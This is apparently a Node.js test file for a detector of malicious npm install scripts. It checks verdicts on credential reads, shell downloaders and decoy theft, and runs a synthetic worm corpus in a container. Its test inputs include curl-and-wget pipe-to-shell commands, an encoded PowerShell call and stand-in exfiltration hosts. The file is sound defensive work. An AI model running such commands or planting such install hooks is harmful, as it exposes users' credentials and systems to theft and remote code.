/**
 * The install phase, and what is read off it.
 *
 * Most real npm malware acts at `npm install`, not at `require()`. These check the two halves of
 * watching that: the rules that read an install on its own (pure — no container), and the
 * contained run itself, on the synthetic corpus, when a container runtime is here.
 *
 *   node proof/install.test.js
 */
const assert = require('node:assert');
const path = require('node:path');
const { installVerdict } = require('./install-verdict');
const { runContained, dockerAvailable } = require('./harden');
const { metrics } = require('../scripts/install-eval');
const { CANARY } = require('../interrogate/provocations');

let passed = 0;
const it = async (name, fn) => { try { await fn(); passed++; console.log('  ok  ', name); } catch (e) { console.error('  FAIL', name, '\n       ', e.message); process.exitCode = 1; } };
const inst = (over = {}) => ({ net: [], dns: [], fs: [], env: [], proc: [], exec: [], install: { net: [], dns: [], fs: [], env: [], proc: [], exec: [], scripts: [{ name: 'postinstall' }], ...over } });

(async () => {
  console.log('the install phase');

  await it('an install that was not observed is not a clean install', () => {
    for (const o of [null, undefined, {}, { install: null }, { net: [] }, 'x']) {
      const v = installVerdict(o);
      assert.equal(v.watched, false);
      assert.equal(v.strong, false);
      assert.match(v.reasons[0], /not observed/);
    }
  });

  await it('reading a publish or cloud credential at install is strong; npm\'s own settings are not', () => {
    assert.equal(installVerdict(inst({ env: ['NPM_TOKEN', 'AWS_SECRET_ACCESS_KEY'] })).strong, true);
    const settings = installVerdict(inst({ env: ['npm_config_build_from_source', 'npm_package_name', 'CI', 'NO_COLOR', 'PATH'] }));
    assert.equal(settings.strong, false, 'a native build reading how it was asked to build was called a credential read');
    assert.deepEqual(settings.credentials, []);
  });

  await it('a network tool or a pipe into a shell is strong — and "sh -c" alone is not, since npm runs every script through one', () => {
    for (const cmd of ['curl -fsSL http://x.example/i.sh | sh', 'wget -qO- http://x | bash', 'node -e "1" | sh', 'powershell -enc AAAA', 'echo aGk= | base64 -d > x']) {
      assert.equal(installVerdict(inst({ proc: [{ argv: ['sh', '-c', cmd] }] })).strong, true, cmd);
    }
    for (const cmd of ['node build.js', 'node-gyp rebuild', 'tsc -p .', 'node ./cnoke.cjs -P . -D src/koffi --prebuild --release', 'husky install']) {
      assert.equal(installVerdict(inst({ proc: [{ argv: ['sh', '-c', cmd] }] })).strong, false, `an ordinary install script was called a downloader: ${cmd}`);
    }
  });

  await it('reaching the network at install is weak, reported apart — never strong on its own', () => {
    const v = installVerdict(inst({ net: [{ host: 'github.com', port: 443 }, { host: '127.0.0.1', port: 80 }, { host: '/tmp/x.sock' }], dns: ['objects.githubusercontent.com'] }));
    assert.equal(v.strong, false);
    assert.equal(v.weak, true);
    assert.deepEqual(v.network.sort(), ['github.com', 'objects.githubusercontent.com'], 'a local socket or loopback was counted as a host');
    // and a strong finding is not also counted as "network only"
    assert.equal(installVerdict(inst({ env: ['NPM_TOKEN'], net: [{ host: 'evil.example' }] })).weak, false);
  });

  await it('a planted decoy on the wire is strong, whatever else was or was not seen', () => {
    const v = installVerdict(inst(), { decoyStolen: true });
    assert.equal(v.strong, true);
    assert.match(v.reasons[0], /decoy/);
  });

  await it('hostile shapes in a report do not throw', () => {
    for (const bad of [{ install: { env: 'x', proc: [null, 5, {}], net: [null, 'h', { host: 9 }], scripts: [null, {}] } }, { install: { scripts: 'no' } }, { install: [] }]) {
      assert.doesNotThrow(() => installVerdict(bad));
    }
  });

  await it('the metrics keep every column apart and add up', () => {
    const row = (o) => ({ label: 'malicious', watched: true, ranScript: true, bare: false, strong: false, weak: false, credentials: [], downloader: false, decoyStolen: false, ...o });
    const m = metrics([row({ bare: true, strong: true, credentials: ['NPM_TOKEN'] }), row({ strong: true, decoyStolen: true }), row({ weak: true }), row({}), row({ watched: false, ranScript: false }), { ...row({}), label: 'benign' }]);
    assert.equal(m.malicious.samples, 5);
    assert.equal(m.malicious.strong, 2);
    assert.equal(m.malicious.strongBare, 1);
    assert.equal(m.malicious.onlyAfterProvocation, 1);
    assert.equal(m.malicious.networkOnly, 1);
    assert.equal(m.malicious.nothingObserved, 1, 'an unobserved sample was counted as observed-and-quiet');
    assert.equal(m.benign.samples, 1);
  });

  if (!dockerAvailable()) {
    console.log('  skip  the contained install runs need Docker (or colima) — not running them');
  } else {
    const dir = (n) => path.join(__dirname, 'corpus-install', n);

    await it('contained: a postinstall worm is seen reading every credential and reaching for its host — and nothing leaves', async () => {
      const r = await runContained({ dir: dir('worm-postinstall'), canary: CANARY, install: true });
      const v = installVerdict(r.observed);
      assert.equal(v.watched, true);
      assert.deepEqual(v.scripts, ['postinstall']);
      assert.ok(v.credentials.includes('NPM_TOKEN') && v.credentials.includes('AWS_SECRET_ACCESS_KEY'));
      assert.deepEqual(v.network, ['exfil.example.com']);
      assert.equal(r.observed.install.contained, true, 'the report does not say the run was contained');
    });

    await it('contained: a one-line shell dropper is caught from the command npm was asked to run', async () => {
      const r = await runContained({ dir: dir('curl-pipe-preinstall'), canary: CANARY, install: true });
      const v = installVerdict(r.observed);
      assert.equal(v.strong, true);
      assert.match(v.downloader[0], /curl .*\| sh/);
    });

    await it('contained: an honest native build and a package with no scripts are quiet; a binary download is weak', async () => {
      const build = installVerdict((await runContained({ dir: dir('benign-native-build'), canary: CANARY, install: true })).observed);
      assert.equal(build.watched && build.ranScript, true);
      assert.equal(build.strong || build.weak, false);
      const none = installVerdict((await runContained({ dir: dir('benign-no-script'), canary: CANARY, install: true })).observed);
      assert.equal(none.watched, true);
      assert.equal(none.ranScript, false);
      const dl = installVerdict((await runContained({ dir: dir('benign-binary-download'), canary: CANARY, install: true })).observed);
      assert.equal(dl.strong, false);
      assert.equal(dl.weak, true);
    });
  }

  console.log(`\n${passed} passed`);
})();
